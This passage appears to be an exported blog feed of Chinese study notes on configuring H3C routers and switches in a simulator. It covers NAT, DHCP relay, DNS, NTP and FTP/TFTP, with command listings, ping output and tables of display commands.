<h2 id="配置-3"><a href="#配置-3" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]acl basic 2000 //配置需转换地址的列表，permit</span><br><span class="line">[RTA-acl-ipv4-basic-2000]description BasicNAT</span><br><span class="line">[RTA-acl-ipv4-basic-2000]rule 0 permit source 10.0.0.0 0.0.0.255</span><br><span class="line">[RTA-acl-ipv4-basic-2000]quit</span><br><span class="line"></span><br><span class="line">[RTA]int g0/0</span><br><span class="line">[RTA-GigabitEthernet0/0]nat outbound 2000  //出端口启用，直接转换为出端口地址</span><br></pre></td></tr></table></figure>

<h2 id="验证-3"><a href="#验证-3" class="headerlink" title="验证"></a>验证</h2><p>此时在PC1、PC2上可以ping通公网Server。</p>
<p>在RTA上查看NAT转换表项，总计两条：</p>
<p><img src="/1023/8.PNG"></p>
<p>可以看出，PC1、PC2地址转换后的公网IP地址均是出端口地址<strong>198.76.28.1</strong>。</p>
<h1 id="NAT-Server（一对一，内部服务器）"><a href="#NAT-Server（一对一，内部服务器）" class="headerlink" title="NAT Server（一对一，内部服务器）"></a>NAT Server（一对一，内部服务器）</h1><h2 id="拓扑-4"><a href="#拓扑-4" class="headerlink" title="拓扑"></a>拓扑</h2><p>拓扑同上。</p>
<h2 id="配置-4"><a href="#配置-4" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[RTA]int g0/0</span><br><span class="line">[RTA-GigabitEthernet0/0]nat server protocol icmp global 198.76.28.11 inside 10.0.0.1 //PC1提供icmp服务</span><br><span class="line">[RTA-GigabitEthernet0/0]nat server protocol tcp global 198.76.28.12 ftp inside 10.0.0.2 //PC2提供ftp服务</span><br></pre></td></tr></table></figure>

<h2 id="验证-4"><a href="#验证-4" class="headerlink" title="验证"></a>验证</h2><p>此时在Server上可以ping通PC1的公网IP<strong>198.76.28.11</strong>。</p>
<p>在RTA上查看NAT server表项，总计两条：</p>
<p><img src="/1023/9.PNG"></p>
<h1 id="NAT的信息显示和调试命令"><a href="#NAT的信息显示和调试命令" class="headerlink" title="NAT的信息显示和调试命令"></a>NAT的信息显示和调试命令</h1><table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>显示地址转换信息</td>
<td><strong>display nat { address-group</strong> <em>group-number</em> <strong>&#x2F; all &#x2F;outbound</strong> <em>port-block-group</em> <strong>&#x2F; server &#x2F; statistics &#x2F; session }</strong></td>
</tr>
<tr>
<td>调试地址转换过程</td>
<td><strong>debugging nat { alg &#x2F; config &#x2F; event &#x2F; packet</strong> <em>acl number</em> <strong>}</strong></td>
</tr>
<tr>
<td>清除地址转换连接</td>
<td><strong>reset nat session</strong></td>
</tr>
</tbody></table>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00060201 第28章 网络地址转换</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>地址转换</tag>
        <tag>NAT</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day9 H3C设备配置DHCP】</title>
    <url>/1024/</url>
    <content><![CDATA[<p>DHCP 是动态主机配置协议的英文缩写，从BOOTP（Bootstrap Protocol）协议发展而来，其作用向主机动态分配IP地址及其他相关信息。</p>
<p>DHCP可以自动为局域网中主机完成TCP&#x2F;IP协议配置，使用DHCP自动配置避免了IP地址冲突的问题。</p>
<p>在H3C模拟器上进行DHCP的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>DHCP采用客户端&#x2F;服务器模式，服务器负责集中管理，客户端向服务器提出配置申请，服务器根据策略返回相应配置信息。</p>
<p>DHCP具有<strong>即插即用性</strong>、<strong>统一管理</strong>、<strong>使用效率高</strong>、<strong>可跨网段实现</strong>等特点。</p>
<p>如下图，DHCP系统由三部分组成：</p>
<ul>
<li>DHCP服务器：能提供DHCP功能的服务器或具有DHCP功能的网络设备</li>
<li>DHCP中继（可选）：一般为路由器或三层交换机等网络设备</li>
<li>DHCP客户端：需要动态获得IP地址的主机</li>
</ul>
<p><img src="/1024/1.PNG"></p>
<p>DHCP的地址分配方式有三种：</p>
<ol>
<li>手工分配</li>
</ol>
<ul>
<li>根据需求，网络管理员为少数特定主机（如DNS服务器、打印机）绑定固定的IP地址，其地址不会过期。</li>
</ul>
<ol start="2">
<li>自动分配</li>
</ol>
<ul>
<li>为连接到网络的某些主机分配IP地址，该地址将长期由该主机使用。</li>
</ul>
<ol start="3">
<li>动态分配</li>
</ol>
<ul>
<li>主机申请IP地址最常用的方法。DHCP服务器为客户端指定一个IP地址，同时为此地址规定了一个租用期限，如果租用时间到期，客户端必须重新申请IP地址。</li>
</ul>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>按照下图拓扑连接，配置基本配置，使拓扑网络互通，同时不配置PC机的IP地址：</p>
<p><img src="/1024/2.PNG"></p>
<p>在<strong>DHCP_Server</strong>上配置dhcp服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DHCP_Server]dhcp server ip-pool pool1</span><br><span class="line">[DHCP_Server-dhcp-pool-pool1]gateway-list 192.168.0.254 //网关地址</span><br><span class="line">[DHCP_Server-dhcp-pool-pool1]network 192.168.0.0 mask 255.255.255.0 //dhcp地址池</span><br><span class="line">[DHCP_Server-dhcp-pool-pool1]dns-list 192.168.0.200 //dns地址</span><br><span class="line">[DHCP_Server-dhcp-pool-pool1]forbidden-ip 192.168.0.2 //禁止下发地址</span><br><span class="line">[DHCP_Server-dhcp-pool-pool1]expired day 5 hour 12 //租约有效期</span><br><span class="line">[DHCP_Server-dhcp-pool-pool1]quit</span><br><span class="line"></span><br><span class="line">[DHCP_Server]dhcp enable</span><br></pre></td></tr></table></figure>

<p>在<strong>DHCP_Relay</strong>上配置dhcp中继服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DHCP_Relay]dhcp enable</span><br><span class="line"></span><br><span class="line">[DHCP_Relay]int g0/1  //选择离client近的端口</span><br><span class="line">[DHCP_Relay-GigabitEthernet0/1]dhcp select relay</span><br><span class="line">[DHCP_Relay-GigabitEthernet0/1]dhcp relay server-address 10.0.0.2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>PC1、PC2配置IPv4为DHCP方式，可以看到PC2获取到了<strong>192.168.0.1&#x2F;24</strong>，PC1获取到了<strong>192.168.0.3&#x2F;24</strong>，而<strong>192.168.0.2&#x2F;24</strong>由于配置了禁止下发，因此dhcp的分配跳过了该ip。</p>
<p><img src="/1024/3.PNG"></p>
<p><img src="/1024/4.PNG"></p>
<h1 id="DHCP相关显示维护命令"><a href="#DHCP相关显示维护命令" class="headerlink" title="DHCP相关显示维护命令"></a>DHCP相关显示维护命令</h1><table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>显示DHCP地址池的可用地址信息</td>
<td><strong>display dhcp server free-ip</strong></td>
</tr>
<tr>
<td>显示DHCP服务器的统计信息</td>
<td><strong>display dhcp server statistics</strong></td>
</tr>
<tr>
<td>显示DHCP地址池中不参与自动分配的IP地址</td>
<td><strong>display dhcp server forbidden-ip</strong></td>
</tr>
<tr>
<td>显示DHCP中继的相关报文统计信息</td>
<td><strong>display dhcp relay statistics [ server-group {</strong> <em>group-id</em> <strong>&#x2F; all } ]</strong></td>
</tr>
</tbody></table>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00040005 第19章 DHCP</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>DHCP</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day10 H3C设备配置DNS】</title>
    <url>/1025/</url>
    <content><![CDATA[<p>DNS （Domain Name System，域名系统）能够提供主机名和IP地址之间的映射。</p>
<p>DNS系统采用客户端&#x2F;服务器模式，是一个具有树状层次结构的，联机分布式数据库系统。</p>
<p>在H3C模拟器上进行DNS的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
<li>DNS系统采用客户机&#x2F;服务器架构，使用的传输层协议为TCP或UDP，服务器端口号53</li>
<li>域名解析工作是通过调用服务器上的解析器软件完成的</li>
<li>DNS域名解析按照域名空间的分层树状结构自顶至下进行</li>
</ul>
<p>H3C设备DNS功能的实现主要是下面三种方式：</p>
<ol>
<li>静态域名解析</li>
</ol>
<ul>
<li>手工建立域名和IP地址之间的对应关系</li>
</ul>
<ol start="2">
<li>动态域名解析</li>
</ol>
<ul>
<li>由DNS域名服务器完成解析</li>
</ul>
<ol start="3">
<li>DNS代理</li>
</ol>
<ul>
<li>设备对DNS解析进行中继</li>
</ul>
<h1 id="静态域名解析"><a href="#静态域名解析" class="headerlink" title="静态域名解析"></a>静态域名解析</h1><p>按照下图拓扑连接，配置基本配置，使拓扑网络互通：</p>
<p><img src="/1025/1.PNG"></p>
<p>在<strong>R1</strong>上配置静态域名解析，通过访问<code>PC1</code>来访问pc1的ip地址：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[R1]ip host PC1 192.168.0.1</span><br><span class="line"></span><br><span class="line">[R1]ping PC1</span><br><span class="line">Ping PC1 (192.168.0.1): 56 data bytes, press CTRL_C to break</span><br><span class="line">56 bytes from 192.168.0.1: icmp_seq=0 ttl=254 time=3.000 ms</span><br><span class="line">56 bytes from 192.168.0.1: icmp_seq=1 ttl=254 time=1.000 ms</span><br><span class="line">56 bytes from 192.168.0.1: icmp_seq=2 ttl=254 time=1.000 ms</span><br><span class="line">56 bytes from 192.168.0.1: icmp_seq=3 ttl=254 time=3.000 ms</span><br><span class="line">56 bytes from 192.168.0.1: icmp_seq=4 ttl=254 time=1.000 ms</span><br><span class="line"></span><br><span class="line">--- Ping statistics for PC1 ---</span><br><span class="line">5 packet(s) transmitted, 5 packet(s) received, 0.0% packet loss</span><br><span class="line">round-trip min/avg/max/std-dev = 1.000/1.800/3.000/0.980 ms</span><br><span class="line">[R1]%Aug  3 09:31:47:247 2019 R1 PING/6/PING_STATISTICS: Ping statistics for PC1: 5 packet(s) transmitted, 5 packet(s) received, 0.0% packet loss, round-trip min/avg/max/std-dev = 1.000/1.800/3.000/0.980 ms.</span><br></pre></td></tr></table></figure>

<h1 id="动态域名解析"><a href="#动态域名解析" class="headerlink" title="动态域名解析"></a>动态域名解析</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑连接，配置基本配置，使拓扑网络互通：</p>
<p><img src="/1025/2.PNG"></p>
<p>组网需求：</p>
<ul>
<li>域名服务器的IP地址是2.1.1.2&#x2F;16，配置域名后缀为com，且com域中包含域名“host”和IP地址3.1.1.1&#x2F;16的对应关系。</li>
<li>Device作为DNS客户端，使用动态域名解析和域名后缀列表功能，实现通过输入host来访问域名为host.com、IP地址为3.1.1.1&#x2F;16的主机Host。</li>
</ul>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="配置域名服务器"><a href="#配置域名服务器" class="headerlink" title="配置域名服务器"></a>配置域名服务器</h3><ol>
<li>进入域名服务器配置界面。</li>
</ol>
<p>在开始菜单中，选择[程序&#x2F;管理工具&#x2F;DNS]。</p>
<ol start="2">
<li>创建区域com。</li>
</ol>
<p>如下图所示，右键点击[正向查找区域]，选择[新建区域]，按照提示创建新的区域com。</p>
<p><img src="/1025/3.PNG"></p>
<ol start="3">
<li>添加域名和IP地址的映射。</li>
</ol>
<p>如下图所示，右键点击区域com。</p>
<p><img src="/1025/4.PNG"></p>
<ol start="4">
<li>选择[新建主机]，弹出如下图的对话框。按照下图输入域名host和IP地址3.1.1.1。</li>
</ol>
<p><img src="/1025/5.PNG"></p>
<h3 id="配置DNS客户端Device"><a href="#配置DNS客户端Device" class="headerlink" title="配置DNS客户端Device"></a>配置DNS客户端Device</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启动态域名解析功能。</span><br><span class="line">&lt;Sysname&gt; system-view</span><br><span class="line">[Sysname] dns resolve</span><br><span class="line"></span><br><span class="line"># 配置域名服务器的IP地址为2.1.1.2。</span><br><span class="line">[Sysname] dns server 2.1.1.2</span><br><span class="line"></span><br><span class="line"># 配置域名后缀com。</span><br><span class="line">[Sysname] dns domain com</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 在设备上执行ping host命令，可以ping通主机，且对应的目的地址为3.1.1.1。</span><br><span class="line">[Sysname] ping host</span><br><span class="line"> Trying DNS resolve, press CTRL_C to break</span><br><span class="line"> Trying DNS server (2.1.1.2)</span><br><span class="line">  PING host.com (3.1.1.1):</span><br><span class="line">  56  data bytes, press CTRL_C to break</span><br><span class="line">    Reply from 3.1.1.1: bytes=56 Sequence=1 ttl=126 time=3 ms</span><br><span class="line">    Reply from 3.1.1.1: bytes=56 Sequence=2 ttl=126 time=1 ms</span><br><span class="line">    Reply from 3.1.1.1: bytes=56 Sequence=3 ttl=126 time=1 ms</span><br><span class="line">    Reply from 3.1.1.1: bytes=56 Sequence=4 ttl=126 time=1 ms</span><br><span class="line">    Reply from 3.1.1.1: bytes=56 Sequence=5 ttl=126 time=1 ms</span><br><span class="line">    </span><br><span class="line">  --- host.com ping statistics ---</span><br><span class="line">    5 packet(s) transmitted</span><br><span class="line">    5 packet(s) received</span><br><span class="line">    0.00% packet loss</span><br><span class="line">    round-trip min/avg/max = 1/1/3 ms</span><br></pre></td></tr></table></figure>

<h1 id="DNS代理"><a href="#DNS代理" class="headerlink" title="DNS代理"></a>DNS代理</h1><table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>使能DNS代理功能</td>
<td><strong>dns proxy enable</strong></td>
</tr>
<tr>
<td>配置指定域名服务器</td>
<td><strong>dns server</strong> <em>ip-address</em></td>
</tr>
</tbody></table>
<h1 id="域名解析显示维护相关命令"><a href="#域名解析显示维护相关命令" class="headerlink" title="域名解析显示维护相关命令"></a>域名解析显示维护相关命令</h1><table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>显示静态域名解析表</td>
<td><strong>display ip host</strong></td>
</tr>
<tr>
<td>显示域名服务器信息</td>
<td><strong>display dns server [ dynamic ]</strong></td>
</tr>
<tr>
<td>显示动态域名缓存区的信息</td>
<td><strong>display dns dynamic-host</strong></td>
</tr>
<tr>
<td>显示DNS代理信息</td>
<td><strong>display dns proxy table</strong></td>
</tr>
</tbody></table>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00040003 第17章 DNS</li>
<li>H3C 04-三层技术-IP业务配置指导 (<a href="http://www.h3c.com/cn/d_201101/707267_30005_0.htm#_Toc280606366">http://www.h3c.com/cn/d_201101/707267_30005_0.htm#_Toc280606366</a> )</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day10 H3C设备配置ntp】</title>
    <url>/1026/</url>
    <content><![CDATA[<p>NTP全称网络时间协议(Network Time Protocol)，它是用来同步网络中各个计算机的时间的协议。</p>
<p>NTP 只考虑 UTC 时间，不考虑时区，不考虑夏令时等。</p>
<p>NTP使用UDP，端口123。</p>
<p>在H3C模拟器上进行DNS的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p>设备可以采用多种NTP工作模式进行时间同步：</p>
<ul>
<li>服务器&#x2F;客户端模式</li>
<li>对等体模式</li>
<li>广播模式</li>
<li>组播模式</li>
</ul>
<p>同时也可在同步模式中加入身份验证等，这里只对服务器&#x2F;客户端模式、广播模式进行模拟验证。</p>
<h1 id="NTP服务器-x2F-客户端模式"><a href="#NTP服务器-x2F-客户端模式" class="headerlink" title="NTP服务器&#x2F;客户端模式"></a>NTP服务器&#x2F;客户端模式</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p>按照下图拓扑连接，配置基本配置，使拓扑网络互通：</p>
<p><img src="/1026/1.PNG"></p>
<p>其中SW1作为ntp服务器，SW2、SW3作为ntp客户端。</p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>首先在<strong>SW1</strong>上修改默认时间：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]clock protocol none</span><br><span class="line">[SW1]quit</span><br><span class="line">&lt;SW1&gt;clock datetime 12:00:00 8/3/2019</span><br></pre></td></tr></table></figure>

<p>此时SW1时间与SW2、SW3时间不同：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;SW1&gt;dis clock</span><br><span class="line">12:03:17 UTC Sat 08/03/2019</span><br><span class="line"></span><br><span class="line">&lt;SW2&gt;dis clock</span><br><span class="line">11:51:28 UTC Sat 08/03/2019</span><br><span class="line"></span><br><span class="line">&lt;SW3&gt;dis clock</span><br><span class="line">11:51:28 UTC Sat 08/03/2019</span><br></pre></td></tr></table></figure>

<p>开启ntp服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW1]clock protocol ntp</span><br><span class="line"></span><br><span class="line"># 开启NTP功能。</span><br><span class="line">[SW1]ntp-service enable</span><br><span class="line"># 设置本地时钟作为参考时钟，层数为2。</span><br><span class="line">[SW1]ntp-service refclock-master 2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW2]ntp-service enable</span><br><span class="line"># 设置NTP Server为Switch B的时间服务器。</span><br><span class="line">[SW2]ntp-service unicast-server 1.0.1.11</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW3]ntp-service enable</span><br><span class="line"># 设置NTP Server为Switch B的时间服务器。</span><br><span class="line">[SW3]ntp-service unicast-server 1.0.1.11</span><br></pre></td></tr></table></figure>

<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>配置完成后，SW2和SW3向SW1进行时间同步。</p>
<p>在SW2上查看NTP的运行状态及会话信息如下图：</p>
<p><img src="/1026/2.PNG"></p>
<p>此时SW2已经与SW1同步，层数比SW1的层数大1，为3。</p>
<h1 id="NTP广播模式"><a href="#NTP广播模式" class="headerlink" title="NTP广播模式"></a>NTP广播模式</h1><h2 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h2><p>拓扑同上。</p>
<h2 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开启NTP功能。</span><br><span class="line">[SW1]ntp-service enable</span><br><span class="line"># 设置本地时钟作为参考时钟，层数为2。</span><br><span class="line">[SW1]ntp-service refclock-master 2</span><br><span class="line"># 配置从Vlan-interface1向网络中发送NTP广播报文。</span><br><span class="line">[SW1]int vlan 1</span><br><span class="line">[SwitchC-Vlan-interface1] ntp-service broadcast-server</span><br><span class="line"></span><br><span class="line">[SW2]ntp-service enable</span><br><span class="line"># 设置为广播客户端，从Vlan-interface1监听广播消息。</span><br><span class="line">[SW2]interface vlan-interface 1</span><br><span class="line">[SW2-Vlan-interface1] ntp-service broadcast-client</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[SW3]ntp-service enable</span><br><span class="line"># 设置为广播客户端，从Vlan-interface1监听广播消息。</span><br><span class="line">[SW3]interface vlan-interface 1</span><br><span class="line">[SW3-Vlan-interface1] ntp-service broadcast-client</span><br></pre></td></tr></table></figure>

<h2 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h2><p>配置完成后，等待一段时间（我的拓扑大约等了2分钟），SW2和SW3自动向SW1进行时间同步。</p>
<p>在SW2上查看NTP的运行状态及会话信息如下图：</p>
<p><img src="/1026/3.PNG"></p>
<p>此时SW2已经与SW1同步，层数比SW1的层数大1，为3。</p>
<h1 id="域名解析显示维护相关命令"><a href="#域名解析显示维护相关命令" class="headerlink" title="域名解析显示维护相关命令"></a>域名解析显示维护相关命令</h1><table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>显示NTP的运行状态</td>
<td><strong>display ntp-service status</strong></td>
</tr>
<tr>
<td>显示NTP会话信息</td>
<td><strong>display ntp-service sessions [ verbose ]</strong></td>
</tr>
<tr>
<td>显示从本地设备沿着时间同步NTP服务器链，回溯到主参考时钟源的各个NTP时间服务器的简要信息</td>
<td><strong>display ntp-service trace</strong></td>
</tr>
<tr>
<td>打开NTP各项信息的调试开关</td>
<td><strong>debugging ntp-service { access &#x2F; adjustment &#x2F; all &#x2F; authentication &#x2F; event &#x2F; filter &#x2F; packet &#x2F; parameter &#x2F; refclock &#x2F; selection &#x2F; synchronization &#x2F; validity }</strong></td>
</tr>
</tbody></table>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C B00900060 NTP</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>ntp</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day11 H3C设备配置FTP】</title>
    <url>/1027/</url>
    <content><![CDATA[<p>文件传输协议是能够提供在远端主机和本地服务器之间传输文件的服务，其中FTP 和TFTP 是最常用的文件传输协议。</p>
<p>在H3C模拟器上进行FTP、TFTP的配置，系统版本v7。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><ol>
<li><p>FTP协议是互联网上广泛使用的文件传输协议。</p>
</li>
<li><p>采用客户端&#x2F;服务器模式，基于TCP。</p>
</li>
<li><p>FTP采用双TCP连接方式：</p>
</li>
</ol>
<ul>
<li><p>控制连接（TCP&#x2F;21）：用于在FTP客户端和FTP服务器之间传输FTP控制命令及命令执行信息。控制连接在整个FTP会话期间一直保持打开。</p>
</li>
<li><p>数据连接（TCP&#x2F;20）：用于传输数据，包括数据上传、下载、文件列表发送等。数据传输结束后数据连接将终止。</p>
</li>
</ul>
<ol start="4">
<li>FTP有两种文件传输模式：</li>
</ol>
<ul>
<li><p>ASCII模式（默认）：本地文件转换成标准的ASCII码再传输，适用于传输文本文件。</p>
</li>
<li><p>二进制流模式（图像文件传输模式）：文件按照比特流的方式进行传输，适用于传送程序文件。</p>
</li>
</ul>
<ol start="5">
<li>FTP采用两种数据传输方式：</li>
</ol>
<ul>
<li><p>主动方式（PORT）：FTP客户端向FTP服务器告知用于传输数据的临时端口号。当需要传送数据时，服务器主动发起连接。</p>
</li>
<li><p>被动方式（PASV）：FTP客户端向FTP服务器告知处于被动方式，服务器选择临时端口号并告知客户端。当需要传送数据时，客户器主动发起连接。</p>
</li>
</ul>
<h2 id="TFTP"><a href="#TFTP" class="headerlink" title="TFTP"></a>TFTP</h2><ol>
<li><p>TFTP（简单文件传输协议）也是采用客户机&#x2F;服务器模式的文件传输协议。</p>
</li>
<li><p>TFTP适用于客户端和服务器之间不需要复杂交互的环境。</p>
</li>
<li><p>TFTP承载在UDP之上，端口号69。</p>
</li>
<li><p>TFTP仅提供简单的文件传输功能（上传、下载）。</p>
</li>
<li><p>TFTP没有存取授权与认证机制，不提供目录列表功能。</p>
</li>
<li><p>TFTP协议传输是由客户端发起的。</p>
</li>
</ol>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="FTP-1"><a href="#FTP-1" class="headerlink" title="FTP"></a>FTP</h2><p>按照下图拓扑连接，配置IP，使网络互通：</p>
<p><img src="/1027/1.PNG"></p>
<p>在<strong>FTP_SERVER</strong>上配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[FTP_SERVER]ftp server enable</span><br><span class="line">[FTP_SERVER]local-user ftp_manage</span><br><span class="line">[FTP_SERVER-luser-manage-ftp_manage]password simple 123456</span><br><span class="line">[FTP_SERVER-luser-manage-ftp_manage]service-type ftp</span><br><span class="line">[FTP_SERVER-luser-manage-ftp_manage]authorization-attribute user-role network-admin</span><br></pre></td></tr></table></figure>

<p>在<strong>FTP_CLIENT</strong>上验证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FTP_CLIENT&gt;ftp 10.0.0.1</span><br><span class="line">Press CTRL+C to abort.</span><br><span class="line">Connected to 10.0.0.1 (10.0.0.1).</span><br><span class="line">220 FTP service ready.</span><br><span class="line">User (10.0.0.1:(none)): ftp_manager</span><br><span class="line">331 Password required for ftp_manager.</span><br><span class="line">Password:123456</span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>

<p>之后即可在客户端执行下列常见操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; pwd  //查看当前所在目录名</span><br><span class="line">257 &quot;/&quot; is your current location</span><br><span class="line"></span><br><span class="line">ftp&gt; ls  //查看当前目录下文件列表</span><br><span class="line">227 Entering Passive Mode (10,0,0,1,236,68)</span><br><span class="line">150 Accepted data connection</span><br><span class="line">drwxrwxrwx    2 0          0                4096 Aug  4 11:07 diagfile</span><br><span class="line">-rwxrwxrwx    1 0          0                   0 Aug  4 11:35 lauth.dat</span><br><span class="line">-rwxrwxrwx    1 0          0               43136 Aug  4 11:07 licbackup</span><br><span class="line">drwxrwxrwx    3 0          0                4096 Aug  4 11:07 license</span><br><span class="line">-rwxrwxrwx    1 0          0               43136 Aug  4 11:07 licnormal</span><br><span class="line">drwxrwxrwx    2 0          0                4096 Aug  4 11:07 logfile</span><br><span class="line">-rwxrwxrwx    1 0          0                   0 Aug  4 11:07 msr36-cmw710-boot-a7514.bin</span><br><span class="line">-rwxrwxrwx    1 0          0                   0 Aug  4 11:07 msr36-cmw710-system-a7514.bin</span><br><span class="line">drwxrwxrwx    2 0          0                4096 Aug  4 11:07 pki</span><br><span class="line">drwxrwxrwx    2 0          0                4096 Aug  4 11:07 seclog</span><br><span class="line">226 10 matches total</span><br><span class="line"></span><br><span class="line">ftp&gt; cd pki  //切换当前所在目录</span><br><span class="line">250 OK. Current directory is /pki</span><br><span class="line"></span><br><span class="line">ftp&gt; ls</span><br><span class="line">227 Entering Passive Mode (10,0,0,1,227,79)</span><br><span class="line">150 Accepted data connection</span><br><span class="line">-rwxrwxrwx    1 0          0                2398 Aug  4 11:07 https-server.p12</span><br><span class="line">226 1 matches total</span><br><span class="line"></span><br><span class="line">ftp&gt; get https-server.p12  //下载FTP服务器上的文件</span><br><span class="line">227 Entering Passive Mode (10,0,0,1,34,49)</span><br><span class="line">150 Accepted data connection</span><br><span class="line">.</span><br><span class="line">226 File successfully transferred</span><br><span class="line">2398 bytes received in 0.003 seconds (780.60 Kbytes/s)</span><br><span class="line"></span><br><span class="line">ftp&gt; cd /</span><br><span class="line">250 OK. Current directory is /</span><br><span class="line"></span><br><span class="line">ftp&gt; put https-server.p12 //上传文件到FTP服务器上</span><br><span class="line">227 Entering Passive Mode (10,0,0,1,93,201)</span><br><span class="line">150 Accepted data connection</span><br><span class="line">.</span><br><span class="line">226 File successfully transferred</span><br><span class="line">2398 bytes sent in 0.000 seconds (2.34 Kbytes/s)</span><br><span class="line"></span><br><span class="line">ftp&gt; bye  //断开ftp连接</span><br><span class="line">221-Goodbye. You uploaded 3 and downloaded 3 kbytes.</span><br><span class="line">221 Logout.</span><br></pre></td></tr></table></figure>

<h2 id="TFTP-1"><a href="#TFTP-1" class="headerlink" title="TFTP"></a>TFTP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Router&gt; tftp server-address &#123; get | put | sget &#125; source-filename [ destination-filename ] [ source &#123; ip source-ip-address | interface interface-type interface-number &#125; ] </span><br></pre></td></tr></table></figure>

<ul>
<li>在用户视图下使用</li>
<li>此命令用于使路由器作为TFTP客户端登录远程TFTP服务器</li>
<li>server-address：TFTP服务器的IP地址或主机名。</li>
<li>source-filename：源文件名。</li>
<li>destination-filename：目标文件名。</li>
<li>get：表示普通下载文件操作。</li>
<li>put：表示上传文件操作。</li>
<li>sget：表示安全下载文件操作。</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C X00040004 第18章 文件传输协议</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>FTP</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习day8 H3C设备配置访问控制列表（ACL）】</title>
    <url>/1022/</url>
    <content><![CDATA[<p>要增强网络安全性，网络设备需要具备控制某些访问或某些数据的能力。</p>
<p>ACL包过滤是一种被广泛使用的网络安全技术。它使用ACL来实现数据识别，并决定是转发还是丢弃这些数据包。</p>
<p>由ACL定义的报文匹配规则，还可以被其它需要对数据进行区分的场合引用。例如<strong>包过滤防火墙功能</strong>、<strong>NAT（Network Address Translation，网络地址转换）</strong>、<strong>QoS（Quality of Service，服务质量）的数据分类</strong>、<strong>路由策略和过滤</strong>、<strong>按需拨号</strong>等几个方面。</p>
<p>在H3C模拟器上进行访问控制列表（ACL）的配置，系统版本v7。</p>
